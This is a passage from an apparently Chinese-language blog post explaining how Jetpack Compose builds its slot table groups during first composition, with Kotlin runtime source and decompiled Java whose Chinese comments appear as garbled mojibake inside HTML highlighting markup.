<span class="hljs-built_in">Count</span>($composer, <span class="hljs-number">0</span>)                             <span class="hljs-comment">// Countå‡½æ•°å¼€å§‹æ‰§è¡Œ</span>
</code></pre>
<h3 data-id="heading-10">doCompose</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">doCompose</span><span class="hljs-params">(
    invalidationsRequested: <span class="hljs-type">ScopeMap</span>&lt;<span class="hljs-type">RecomposeScopeImpl</span>, Any&gt;,
    content: (@<span class="hljs-type">Composable</span> () -&gt; <span class="hljs-type">Unit</span>)?,
)</span></span> {
    runtimeCheck(!isComposing) { <span class="hljs-string">"Reentrant composition is not supported"</span> }
    <span class="hljs-keyword">val</span> observer = observerHolder.current()
    trace(<span class="hljs-string">"Compose:recompose"</span>) {
        compositionToken = currentSnapshot().snapshotId.hashCode()
        providerUpdates = <span class="hljs-literal">null</span>
        updateComposerInvalidations(invalidationsRequested)
        nodeIndex = <span class="hljs-number">0</span>
        <span class="hljs-keyword">var</span> complete = <span class="hljs-literal">false</span>
        isComposing = <span class="hljs-literal">true</span>
        observer?.onBeginComposition(composition)
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åˆ›å»ºç¬¬ä¸€ä¸ªç»„</span>
            startRoot()

            <span class="hljs-comment">// vv Experimental for forced</span>
            <span class="hljs-keyword">val</span> savedContent = nextSlot()
            <span class="hljs-keyword">if</span> (savedContent !== content &amp;&amp; content != <span class="hljs-literal">null</span>) {
                <span class="hljs-comment">// ä¿å­˜setContentæ–¹æ³•ä¼ å…¥lambdaåˆ°slotsæ•°ç»„</span>
                updateValue(content <span class="hljs-keyword">as</span> Any?)
            }
            <span class="hljs-comment">// ^^ Experimental for forced</span>

            <span class="hljs-comment">// Ignore reads of derivedStateOf recalculations</span>
            observeDerivedStateRecalculations(derivedStateObserver) {
                <span class="hljs-keyword">if</span> (content != <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// åˆ›å»ºkeyä¸º200çš„ç»„</span>
                    startGroup(invocationKey, invocation)
                    <span class="hljs-comment">// è°ƒç”¨Countå‡½æ•°</span>
                    invokeComposable(<span class="hljs-keyword">this</span>, content)
                    <span class="hljs-comment">// ç»“æŸç»„</span>
                    endGroup()
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (
                    (forciblyRecompose || providersInvalid) &amp;&amp;
                        savedContent != <span class="hljs-literal">null</span> &amp;&amp;
                        savedContent != Composer.Empty
                ) {
                    startGroup(invocationKey, invocation)
                    <span class="hljs-meta">@Suppress(<span class="hljs-string">"UNCHECKED_CAST"</span>)</span>
                    invokeComposable(<span class="hljs-keyword">this</span>, savedContent <span class="hljs-keyword">as</span> <span class="hljs-meta">@Composable</span> () -&gt; <span class="hljs-built_in">Unit</span>)
                    endGroup()
                } <span class="hljs-keyword">else</span> {
                    skipCurrentGroup()
                }
            }
            <span class="hljs-comment">// ç»„åˆå®Œæˆ</span>
            endRoot()
            complete = <span class="hljs-literal">true</span>
        } <span class="hljs-keyword">catch</span> (e: Throwable) {
            <span class="hljs-keyword">throw</span> e.attachComposeStackTrace { currentStackTrace() }
        } <span class="hljs-keyword">finally</span> {
            observer?.onEndComposition(composition)
            isComposing = <span class="hljs-literal">false</span>
            invalidations.clear()
            <span class="hljs-keyword">if</span> (!complete) abortRoot()
            createFreshInsertTable()
        }
    }
}
</code></pre>
<p>å½“<code>startRoot()</code>ã€<code>updateValue(content as Any?)</code>ã€<code>startGroup(invocationKey, invocation)</code>æ‰§è¡Œå®Œæˆåï¼Œgroupsæ•°ç»„å°±å˜æˆäº†è¿™æ ·ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">Group</span> <span class="hljs-number">0</span>: Root <span class="hljs-keyword">Group</span> (<span class="hljs-keyword">key</span> = <span class="hljs-number">100</span>)
â”œâ”€â”€ <span class="hljs-keyword">Group</span> <span class="hljs-number">1</span>: KeyHash <span class="hljs-keyword">Group</span> (<span class="hljs-keyword">key</span> = parentContext.compositeKeyHashCode)
â””â”€â”€ slots[<span class="hljs-number">0</span>]: content lambda (setContent ä¼ å…¥çš„ lambda)
    â””â”€â”€ <span class="hljs-keyword">Group</span> <span class="hljs-number">2</span>: Invocation <span class="hljs-keyword">Group</span> (<span class="hljs-keyword">key</span> = invocationKey)
</code></pre>
<p>ä»<code>startRoot</code>å¼€å§‹é‡ç‚¹è§£æä¸‹ç»„æ˜¯å¦‚ä½•åˆ›å»ºçš„ã€‚</p>
<h3 data-id="heading-11">startRoot</h3>
<p>startRootç”¨äºåˆ›å»ºgroupsæ•°ç»„çš„ç¬¬ä¸€ä¸ªç»„ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@OptIn(InternalComposeApi::class)</span>
<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startRoot</span><span class="hljs-params">()</span></span> {
    rGroupIndex = <span class="hljs-number">0</span>
    reader = slotTable.openReader()  <span class="hljs-comment">// æ‰“å¼€ SlotReader</span>
    
    <span class="hljs-comment">// =========================================</span>
    <span class="hljs-comment">// åˆ›å»º Root Groupï¼ˆkey = rootKey = 100ï¼‰</span>
    <span class="hljs-comment">// è¿™æ˜¯ groups æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªç»„</span>
    <span class="hljs-comment">// =========================================</span>
    startGroup(rootKey)  <span class="hljs-comment">// rootKey = 100</span>

    <span class="hljs-comment">// å¤„ç† CompositionLocal</span>
    parentContext.startComposing()
    <span class="hljs-keyword">val</span> parentProvider = parentContext.getCompositionLocalScope()
    providersInvalidStack.push(providersInvalid.asInt())
    providersInvalid = changed(parentProvider)
    providerCache = <span class="hljs-literal">null</span>

    <span class="hljs-comment">// å¤„ç†å¼ºåˆ¶é‡ç»„ä½œç”¨åŸŸ</span>
    <span class="hljs-keyword">if</span> (!forceRecomposeScopes) {
        forceRecomposeScopes = parentContext.collectingParameterInformation
    }

    <span class="hljs-comment">// å¤„ç†æºç æ ‡è®°</span>
    <span class="hljs-keyword">if</span> (!sourceMarkersEnabled) {
        sourceMarkersEnabled = parentContext.collectingSourceInformation
    }

    rootProvider = <span class="hljs-keyword">if</span> (sourceMarkersEnabled) {
        <span class="hljs-meta">@Suppress(<span class="hljs-string">"UNCHECKED_CAST"</span>)</span>
        parentProvider.putValue(
            LocalCompositionErrorContext <span class="hljs-keyword">as</span> CompositionLocal&lt;Any?&gt;,
            StaticValueHolder(errorContext),
        )
    } <span class="hljs-keyword">else</span> {
        parentProvider
    }

    rootProvider.read(LocalInspectionTables)?.let {
        it.add(compositionData)
        parentContext.recordInspectionTable(it)
    }

    <span class="hljs-comment">// =========================================</span>
    <span class="hljs-comment">// åˆ›å»º KeyHash Group</span>
    <span class="hljs-comment">// è¿™æ˜¯ Root Group çš„å­ Group</span>
    <span class="hljs-comment">// =========================================</span>
    startGroup(parentContext.compositeKeyHashCode.hashCode())
}
</code></pre>
<p>startRootè°ƒç”¨startGroup(rootKey)åˆ›å»ºç¬¬ä¸€ä¸ªç»„ï¼Œkeyä¸º100ï¼ŒstartGroupè°ƒç”¨startã€‚</p>
<h3 data-id="heading-12">start</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">start</span><span class="hljs-params">(key: <span class="hljs-type">Int</span>, objectKey: <span class="hljs-type">Any</span>?, kind: <span class="hljs-type">GroupKind</span>, <span class="hljs-keyword">data</span>: <span class="hljs-type">Any</span>?)</span></span> {
    <span class="hljs-comment">// isNodeä¸ºfalseï¼Œå› ä¸ºæ•°ç»„çš„ç¬¬ä¸€ä¸ªç»„ä¸æ˜¯èŠ‚ç‚¹ï¼ŒTextã€Colimnã€Buttonæ˜¯èŠ‚ç‚¹</span>
    <span class="hljs-keyword">val</span> isNode = kind.isNode
    <span class="hljs-keyword">if</span> (inserting) {
        <span class="hljs-comment">// é¦–æ¬¡ç»„åˆï¼Œinsertingä¸ºtrue</span>
        reader.beginEmpty()
        <span class="hljs-keyword">val</span> startIndex = writer.currentGroup
        <span class="hljs-keyword">when</span> {
            isNode -&gt; writer.startNode(key, Composer.Empty)
            <span class="hljs-keyword">data</span> != <span class="hljs-literal">null</span> -&gt; writer.startData(key, objectKey ?: Composer.Empty, <span class="hljs-keyword">data</span>)
            <span class="hljs-comment">// è°ƒç”¨SlotTableçš„startGroup</span>
            <span class="hljs-keyword">else</span> -&gt; writer.startGroup(key, objectKey ?: Composer.Empty)
        }
        pending?.let { pending -&gt;
            <span class="hljs-keyword">val</span> insertKeyInfo =
                KeyInfo(
                    key = key,
                    objectKey = -<span class="hljs-number">1</span>,
                    location = insertedGroupVirtualIndex(startIndex),
                    nodes = -<span class="hljs-number">1</span>,
                    index = <span class="hljs-number">0</span>,
                )
            pending.registerInsert(insertKeyInfo, nodeIndex - pending.startIndex)
            pending.recordUsed(insertKeyInfo)
        }
        enterGroup(isNode, <span class="hljs-literal">null</span>)
        <span class="hljs-keyword">return</span>
    }
    <span class="hljs-comment">// çœç•¥åé¢çš„ä»£ç ï¼Œé‡ç»„çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œåé¢çš„ä»£ç </span>
}
</code></pre>
<h3 data-id="heading-13">SlotTableçš„startGroup</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startGroup</span><span class="hljs-params">(key: <span class="hljs-type">Int</span>, objectKey: <span class="hljs-type">Any</span>?, isNode: <span class="hljs-type">Boolean</span>, aux: <span class="hljs-type">Any</span>?)</span></span> {
    <span class="hljs-keyword">val</span> previousParent = parent
    <span class="hljs-keyword">val</span> inserting = insertCount &gt; <span class="hljs-number">0</span>
    nodeCountStack.push(nodeCount)

    currentGroupEnd =
        <span class="hljs-keyword">if</span> (inserting) {
            <span class="hljs-keyword">val</span> current = currentGroup
            <span class="hljs-keyword">val</span> newCurrentSlot = groups.dataIndex(groupIndexToAddress(current))
            <span class="hljs-comment">// æ’å…¥ä¸€ä¸ªç»„</span>
            insertGroups(<span class="hljs-number">1</span>)
            currentSlot = newCurrentSlot
            currentSlotEnd = newCurrentSlot
            <span class="hljs-keyword">val</span> currentAddress = groupIndexToAddress(current)
            <span class="hljs-keyword">val</span> hasObjectKey = objectKey !== Composer.Empty
            <span class="hljs-keyword">val</span> hasAux = !isNode &amp;&amp; aux !== Composer.Empty
            <span class="hljs-keyword">val</span> dataAnchor =
                dataIndexToDataAnchor(
                        index = newCurrentSlot,
                        gapLen = slotsGapLen,
                        gapStart = slotsGapStart,
                        capacity = slots.size,
                    )
                    .let { anchor -&gt;
                        <span class="hljs-keyword">if</span> (anchor &gt;= <span class="hljs-number">0</span> &amp;&amp; slotsGapOwner &lt; current) {
                            <span class="hljs-keyword">val</span> slotsSize = slots.size - slotsGapLen
                            -(slotsSize - anchor + <span class="hljs-number">1</span>)
                        } <span class="hljs-keyword">else</span> anchor
                    }
            <span class="hljs-comment">// åˆå§‹åŒ–ç»„        </span>
            groups.initGroup(
                address = currentAddress,
                key = key,
                isNode = isNode,
                hasDataKey = hasObjectKey,
                hasData = hasAux,
                parentAnchor = parent,
                dataAnchor = dataAnchor,
            )

            <span class="hljs-keyword">val</span> dataSlotsNeeded =
                (<span class="hljs-keyword">if</span> (isNode) <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>) + (<span class="hljs-keyword">if</span> (hasObjectKey) <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>) + (<span class="hljs-keyword">if</span> (hasAux) <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>)
            <span class="hljs-keyword">if</span> (dataSlotsNeeded &gt; <span class="hljs-number">0</span>) {
                insertSlots(dataSlotsNeeded, current)
                <span class="hljs-keyword">val</span> slots = slots
                <span class="hljs-keyword">var</span> currentSlot = currentSlot
                <span class="hljs-keyword">if</span> (isNode) slots[currentSlot++] = aux
                <span class="hljs-keyword">if</span> (hasObjectKey) slots[currentSlot++] = objectKey
                <span class="hljs-keyword">if</span> (hasAux) slots[currentSlot++] = aux
                <span class="hljs-keyword">this</span>.currentSlot = currentSlot
            }
            nodeCount = <span class="hljs-number">0</span>
            <span class="hljs-keyword">val</span> newCurrent = current + <span class="hljs-number">1</span>
            <span class="hljs-keyword">this</span>.parent = current
            <span class="hljs-keyword">this</span>.currentGroup = newCurrent
            <span class="hljs-keyword">if</span> (previousParent &gt;= <span class="hljs-number">0</span>) {
                sourceInformationOf(previousParent)?.reportGroup(<span class="hljs-keyword">this</span>, current)
            }
            newCurrent
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// çœç•¥åé¢çš„ä»£ç ï¼Œé‡ç»„çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œåé¢çš„ä»£ç </span>
        }
}
</code></pre>
<h3 data-id="heading-14">insertGroups</h3>
<p>insertGroupså…¶å®å°±æ˜¯ä½¿ç”¨GapBufferï¼Œå¦‚æœä½ å¯¹GapBufferä¸ç†Ÿæ‚‰ï¼Œè¯·é˜…è¯»<a href="https://juejin.cn/post/7591338980693852206" target="_blank" title="https://juejin.cn/post/7591338980693852206">ComposeåŸç†äºŒä¹‹GapBuffer</a></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">insertGroups</span><span class="hljs-params">(size: <span class="hljs-type">Int</span>)</span></span> {
    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">val</span> currentGroup = currentGroup
        <span class="hljs-comment">// å°†é—´éš™ç§»åŠ¨åˆ°ç›®æ ‡ä½ç½®</span>
        moveGroupGapTo(currentGroup)
        <span class="hljs-keyword">val</span> gapStart = groupGapStart
        <span class="hljs-keyword">var</span> gapLen = groupGapLen
        <span class="hljs-keyword">val</span> oldCapacity = groups.size / Group_Fields_Size
        <span class="hljs-keyword">val</span> oldSize = oldCapacity - gapLen
        <span class="hljs-keyword">if</span> (gapLen &lt; size) {
            <span class="hljs-comment">// é—´éš™ç”¨å®Œï¼Œæ‰©å®¹2å€</span>
            <span class="hljs-keyword">val</span> groups = groups

            <span class="hljs-comment">// Double the size of the array, but at least MinGrowthSize and &gt;= size</span>
            <span class="hljs-keyword">val</span> newCapacity = max(max(oldCapacity * <span class="hljs-number">2</span>, oldSize + size), MinGroupGrowthSize)
            <span class="hljs-keyword">val</span> newGroups = IntArray(newCapacity * Group_Fields_Size)
            <span class="hljs-keyword">val</span> newGapLen = newCapacity - oldSize
            <span class="hljs-keyword">val</span> oldGapEndAddress = gapStart + gapLen
            <span class="hljs-keyword">val</span> newGapEndAddress = gapStart + newGapLen

            <span class="hljs-comment">// å¤åˆ¶æ•°ç»„</span>
            groups.copyInto(
                destination = newGroups,
                destinationOffset = <span class="hljs-number">0</span>,
                startIndex = <span class="hljs-number">0</span>,
                endIndex = gapStart * Group_Fields_Size,
            )
            groups.copyInto(
                destination = newGroups,
                destinationOffset = newGapEndAddress * Group_Fields_Size,
                startIndex = oldGapEndAddress * Group_Fields_Size,
                endIndex = oldCapacity * Group_Fields_Size,
            )

            <span class="hljs-comment">// ä½¿ç”¨æ‰©å®¹åçš„groupsæ•°ç»„</span>
            <span class="hljs-keyword">this</span>.groups = newGroups
            <span class="hljs-comment">// æ›´æ–°é—´éš™é•¿åº¦</span>
            gapLen = newGapLen
        }

        <span class="hljs-comment">// Move the currentGroupEnd to account for inserted groups.</span>
        <span class="hljs-keyword">val</span> currentEnd = currentGroupEnd
        <span class="hljs-keyword">if</span> (currentEnd &gt;= gapStart) <span class="hljs-keyword">this</span>.currentGroupEnd = currentEnd + size

        <span class="hljs-comment">// æ›´æ–°é—´éš™çš„èµ·å§‹ä½ç½®å’Œé—´éš™çš„é•¿åº¦</span>
        <span class="hljs-keyword">this</span>.groupGapStart = gapStart + size
        <span class="hljs-keyword">this</span>.groupGapLen = gapLen - size

        <span class="hljs-comment">// çœç•¥åé¢çš„ä»£ç </span>
        
    }
}
</code></pre>
<h3 data-id="heading-15">groups.initGroup</h3>
<p>groupsæ•°ç»„ä¸­æ¯5ä¸ªIntä¸ºä¸€ç»„ï¼ŒinitGroupå°±æ˜¯ç”¨æ¥åˆå§‹åŒ–5ä¸ªintã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> IntArray.<span class="hljs-title">initGroup</span><span class="hljs-params">(
    address: <span class="hljs-type">Int</span>,
    key: <span class="hljs-type">Int</span>,
    isNode: <span class="hljs-type">Boolean</span>,
    hasDataKey: <span class="hljs-type">Boolean</span>,
    hasData: <span class="hljs-type">Boolean</span>,
    parentAnchor: <span class="hljs-type">Int</span>,
    dataAnchor: <span class="hljs-type">Int</span>,
)</span></span> {
    <span class="hljs-keyword">val</span> arrayIndex = address * Group_Fields_Size  <span class="hljs-comment">// 0 * 5 = 0</span>
    <span class="hljs-keyword">this</span>[arrayIndex + Key_Offset] = key           <span class="hljs-comment">// groups[0] = 100</span>
    <span class="hljs-keyword">this</span>[arrayIndex + GroupInfo_Offset] =         <span class="hljs-comment">// groups[1] = 0 (æ— æ ‡å¿—ä½)</span>
        (isNode.toBit() shl NodeBit_Shift) or
        (hasDataKey.toBit() shl ObjectKey_Shift) or
        (hasData.toBit() shl Aux_Shift)
    <span class="hljs-keyword">this</span>[arrayIndex + ParentAnchor_Offset] = parentAnchor  <span class="hljs-comment">// groups[2] = -1</span>
    <span class="hljs-keyword">this</span>[arrayIndex + Size_Offset] = <span class="hljs-number">0</span>            <span class="hljs-comment">// groups[3] = 0 (ç¨åæ›´æ–°)</span>
    <span class="hljs-keyword">this</span>[arrayIndex + DataAnchor_Offset] = dataAnchor  <span class="hljs-comment">// groups[4] = 0</span>
}
</code></pre>
<h3 data-id="heading-16">ä¿å­˜setContentæ–¹æ³•ä¼ å…¥çš„lambdaåˆ°slotsæ•°ç»„</h3>
<p><code>startRoot</code>æ‰§è¡Œå®Œæˆåï¼Œä¿å­˜setContentæ–¹æ³•ä¼ å…¥çš„lambdaåˆ°slotsæ•°ç»„</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> savedContent = nextSlot()
<span class="hljs-comment">// ä¿å­˜setContentæ–¹æ³•ä¼ å…¥lambdaåˆ°slotsæ•°ç»„</span>
<span class="hljs-keyword">if</span> (savedContent !== content &amp;&amp; content != <span class="hljs-literal">null</span>) {
    updateValue(content <span class="hljs-keyword">as</span> Any?)
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">updateValue</span><span class="hljs-params">(value: <span class="hljs-type">Any</span>?)</span></span> {
    <span class="hljs-keyword">if</span> (inserting) {
        <span class="hljs-comment">// å†™å…¥åˆ°slotsæ•°ç»„</span>
        writer.update(value)
    } <span class="hljs-keyword">else</span> {
       <span class="hljs-comment">// çœç•¥åé¢çš„ä»£ç </span>
    }
</code></pre>
<h3 data-id="heading-17">invokeComposable(this, content)</h3>
<p>ç¼–è¯‘åçš„Countå‡½æ•°æœ‰æ¥ä¸¤ä¸ªå‚æ•°ï¼ŒrealFnå°±æ˜¯è°ƒç”¨Countå‡½æ•°ï¼Œä¼ å…¥composeå¯¹è±¡å’Œå‚æ•°1ï¼Œå‚æ•°1è¡¨ç¤ºæ²¡æœ‰å‘ç”Ÿæ”¹å˜ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">actual</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">invokeComposable</span><span class="hljs-params">(composer: <span class="hljs-type">Composer</span>, composable: @<span class="hljs-type">Composable</span> () -&gt; <span class="hljs-type">Unit</span>)</span></span> {
    <span class="hljs-meta">@Suppress(<span class="hljs-string">"UNCHECKED_CAST"</span>)</span> <span class="hljs-keyword">val</span> realFn = composable <span class="hljs-keyword">as</span> Function2&lt;Composer, <span class="hljs-built_in">Int</span>, <span class="hljs-built_in">Unit</span>&gt;
    <span class="hljs-comment">// è°ƒç”¨countå‡½æ•°</span>
    realFn(composer, <span class="hljs-number">1</span>)
}
</code></pre>
<p>åˆ°æ­¤ï¼Œcountå‡½æ•°å¼€å§‹æ‰§è¡Œï¼Œåœ¨æ‰§è¡Œä¹‹å‰ï¼Œgroupsæ•°ç»„å·²ç»æœ‰è¿™äº›æ•°æ®äº†ã€‚</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">Group</span> <span class="hljs-number">0</span>: Root <span class="hljs-keyword">Group</span> (<span class="hljs-keyword">key</span> = <span class="hljs-number">100</span>)
â”œâ”€â”€ <span class="hljs-keyword">Group</span> <span class="hljs-number">1</span>: KeyHash <span class="hljs-keyword">Group</span> (<span class="hljs-keyword">key</span> = parentContext.compositeKeyHashCode)
â””â”€â”€ slots[<span class="hljs-number">0</span>]: content lambda (setContent ä¼ å…¥çš„ lambda)
    â””â”€â”€ <span class="hljs-keyword">Group</span> <span class="hljs-number">2</span>: Invocation <span class="hljs-keyword">Group</span> (<span class="hljs-keyword">key</span> = invocationKey)
</code></pre>
<p>ç¼–è¯‘åçš„Countå‡½æ•°æ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Count</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Composer $composer, <span class="hljs-type">int</span> $changed)</span> {
    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-comment">// æ­¥éª¤1: å¯åŠ¨ RestartGroup</span>
    <span class="hljs-comment">// startRestartGroup ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ Group å¹¶è®°å½• RecomposeScope</span>
    <span class="hljs-comment">// key = -1491082337 æ˜¯ç¼–è¯‘å™¨ä¸º Count å‡½æ•°ç”Ÿæˆçš„å”¯ä¸€æ ‡è¯†</span>
    <span class="hljs-comment">// ============================================================</span>
    $composer = $composer.startRestartGroup(-<span class="hljs-number">1491082337</span>);
    
    <span class="hljs-comment">// è®°å½•æºä»£ç ä½ç½®ä¿¡æ¯ï¼ˆç”¨äºè°ƒè¯•å’Œå·¥å…·ï¼‰</span>
    ComposerKt.sourceInformation($composer, <span class="hljs-string">"C(Count)20@464L30,24@544L40,22@500L85:Demo.kt#bw2bq5"</span>);
    
    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-comment">// æ­¥éª¤2: è·³è¿‡æ£€æŸ¥</span>
    <span class="hljs-comment">// å¦‚æœ $changed == 0 ä¸”å¯ä»¥è·³è¿‡ï¼Œåˆ™è·³è¿‡æ•´ä¸ªç»„åˆ</span>
    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-keyword">if</span> ($changed == <span class="hljs-number">0</span> &amp;&amp; $composer.getSkipping()) {
        $composer.skipToGroupEnd();
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¼€å§‹è·Ÿè¸ªï¼ˆç”¨äºæ€§èƒ½åˆ†æï¼‰</span>
        <span class="hljs-keyword">if</span> (ComposerKt.isTraceInProgress()) {
            ComposerKt.traceEventStart(-<span class="hljs-number">1491082337</span>, $changed, -<span class="hljs-number">1</span>, <span class="hljs-string">"com.example.kmp.Count (Demo.kt:18)"</span>);
        }

        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤3: remember å— - åˆ›å»ºå¹¶ç¼“å­˜ MutableState</span>
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">$i$f$remember</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// sourceInformationMarkerStart ä¸åˆ›å»º Groupï¼Œåªæ˜¯æ ‡è®°æºä»£ç ä½ç½®</span>
        ComposerKt.sourceInformationMarkerStart($composer, -<span class="hljs-number">492369756</span>, <span class="hljs-string">"CC(remember)N(calculation):Composables.kt#9igjgp"</span>);
        
        <span class="hljs-type">boolean</span> <span class="hljs-variable">invalid$iv$iv</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>)<span class="hljs-number">0</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">$i$f$cache</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤4: è¯»å–å·²ç¼“å­˜çš„å€¼</span>
        <span class="hljs-comment">// rememberedValue() ä»å½“å‰ slot è¯»å–ä¹‹å‰å­˜å‚¨çš„å€¼</span>
        <span class="hljs-comment">// å¦‚æœæ˜¯é¦–æ¬¡ç»„åˆï¼Œè¿”å› Composer.Empty</span>
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">it$iv$iv</span> <span class="hljs-operator">=</span> $composer.rememberedValue();
        
        <span class="hljs-type">int</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        Object var10000;
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤5: åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ›å»ºæ–°å€¼</span>
        <span class="hljs-comment">// å¦‚æœè¯»å–åˆ° Emptyï¼Œè¯´æ˜æ˜¯é¦–æ¬¡ç»„åˆï¼Œéœ€è¦åˆ›å»ºæ–°çš„ MutableState</span>
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-keyword">if</span> (it$iv$iv == Composer.Companion.getEmpty()) {
            <span class="hljs-type">int</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-comment">// åˆ›å»º MutableState&lt;Int&gt;ï¼Œåˆå§‹å€¼ä¸º 0</span>
            <span class="hljs-type">Object</span> <span class="hljs-variable">value$iv$iv</span> <span class="hljs-operator">=</span> SnapshotStateKt.mutableStateOf$<span class="hljs-keyword">default</span>(<span class="hljs-number">0</span>, (SnapshotMutationPolicy)<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>, (Object)<span class="hljs-literal">null</span>);
            <span class="hljs-comment">// å°†æ–°åˆ›å»ºçš„å€¼å­˜å‚¨åˆ° slot</span>
            $composer.updateRememberedValue(value$iv$iv);
            var10000 = value$iv$iv;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// é‡ç»„æ—¶ç›´æ¥ä½¿ç”¨ç¼“å­˜çš„å€¼</span>
            var10000 = it$iv$iv;
        }

        <span class="hljs-type">Object</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var10000;
        ComposerKt.sourceInformationMarkerEnd($composer);
        
        <span class="hljs-comment">// content$delegate å°±æ˜¯ remember { mutableStateOf(0) } çš„ç»“æœ</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">MutableState</span> <span class="hljs-variable">content$delegate</span> <span class="hljs-operator">=</span> (MutableState)var11;
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤6: ä¸º onClick lambda åˆ›å»º ReplaceGroup</span>
        <span class="hljs-comment">// startReplaceGroup åˆ›å»ºä¸€ä¸ªå¯æ›¿æ¢çš„ Group</span>
        <span class="hljs-comment">// key = -548075111 æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„å”¯ä¸€æ ‡è¯†</span>
        <span class="hljs-comment">// ============================================================</span>
        $composer.startReplaceGroup(-<span class="hljs-number">548075111</span>);
        
        <span class="hljs-comment">// æ£€æŸ¥ content$delegate æ˜¯å¦å‘ç”Ÿå˜åŒ–</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">$this$cache$iv$iv</span> <span class="hljs-operator">=</span> $composer.changed(content$delegate);
        
        invalid$iv$iv = (<span class="hljs-type">boolean</span>)<span class="hljs-number">0</span>;
        <span class="hljs-type">Object</span> <span class="hljs-variable">it$iv</span> <span class="hljs-operator">=</span> $composer.rememberedValue();
        <span class="hljs-type">int</span> <span class="hljs-variable">var16</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤7: ç¼“å­˜ onClick lambda</span>
        <span class="hljs-comment">// å¦‚æœä¾èµ–æ²¡å˜ä¸”ä¹‹å‰æœ‰ç¼“å­˜ï¼Œä½¿ç”¨ç¼“å­˜çš„ lambda</span>
        <span class="hljs-comment">// å¦åˆ™åˆ›å»ºæ–°çš„ lambda å¹¶ç¼“å­˜</span>
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-keyword">if</span> (!$<span class="hljs-built_in">this</span>$cache$iv$iv &amp;&amp; it$iv != Composer.Companion.getEmpty()) {
            var10000 = it$iv;
        } <span class="hljs-keyword">else</span> {
            var9 = <span class="hljs-number">0</span>;
            <span class="hljs-comment">// DemoKt::Count$lambda$4$lambda$3 æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„ lambda å¼•ç”¨</span>
